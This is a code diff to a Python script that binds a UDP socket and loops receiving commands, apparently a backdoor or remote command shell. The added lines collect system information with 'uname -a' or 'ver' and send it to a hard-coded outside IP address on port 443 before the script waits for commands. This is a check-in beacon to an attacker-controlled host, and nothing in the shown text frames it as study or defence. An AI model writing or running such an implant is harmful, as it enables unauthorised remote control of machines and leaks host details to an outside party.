@@ -3,6 +3,12 @@ import sys, socket, subprocess
 try:
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.bind(('0.0.0.0', 5151))
+	try:
+		uname = subprocess.check_output('uname -a', shell=True)
+	except subprocess.CalledProcessError:
+		uname = subprocess.check_output('ver', shell=True)
+			
+	sock.sendto(uname, ('68.183.187.166', 443))
 	while True:
 		command = sock.recvfrom(4096)
 		#print(command)
